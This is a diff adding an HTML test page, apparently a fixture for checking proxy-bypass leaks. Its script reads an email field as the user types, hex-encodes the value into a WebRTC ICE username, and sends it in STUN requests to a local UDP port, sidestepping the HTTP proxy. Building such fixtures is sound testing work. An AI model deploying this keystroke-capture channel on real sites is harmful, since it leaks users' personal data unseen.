@@ -1,0 +1,26 @@
+<!doctype html><html lang="en"><body>
+<!-- The field's value, hex-encoded (an ICE ufrag allows no @), becomes the remote ufrag of a peer connection whose remote
+     candidate is the UDP port given in ?u=: every ICE connectivity check (a STUN binding request) carries it there. UDP
+     goes around the HTTP proxy of a context (third review of PR #11: 28 datagrams with a value in 3 runs). -->
+<form id="f" novalidate><label>Email <input id="email" name="email" type="text"></label><button type="submit">Send</button></form>
+<script>
+const em = document.getElementById('email');
+const port = new URLSearchParams(location.search).get('u');
+const hex = s => Array.from(new TextEncoder().encode(s), b => b.toString(16).padStart(2, '0')).join('');
+let last = '';
+async function send(v) {
+  try {
+    const pc = new RTCPeerConnection();
+    pc.createDataChannel('x');
+    await pc.setLocalDescription(await pc.createOffer());
+    const sdp = ['v=0', 'o=- 1 1 IN IP4 0.0.0.0', 's=-', 't=0 0', 'a=group:BUNDLE 0', 'm=application 9 UDP/DTLS/SCTP webrtc-datachannel',
+      'c=IN IP4 0.0.0.0', 'a=mid:0', 'a=ice-ufrag:' + hex(v).slice(0, 250), 'a=ice-pwd:aaaaaaaaaaaaaaaaaaaaaaaa',
+      'a=fingerprint:sha-256 ' + Array(32).fill('AB').join(':'), 'a=setup:active', 'a=sctp-port:5000', ''].join('\r\n');
+    await pc.setRemoteDescription({ type: 'answer', sdp });
+    await pc.addIceCandidate({ candidate: `candidate:1 1 udp 2122260223 127.0.0.1 ${port} typ host`, sdpMid: '0' });
+  } catch { /* no WebRTC: nothing to send */ }
+}
+setInterval(() => { const v = em.value; if (v && v !== last) { last = v; send(v); } }, 20);
+document.getElementById('f').addEventListener('submit', e => e.preventDefault());
+</script>
+</body></html>
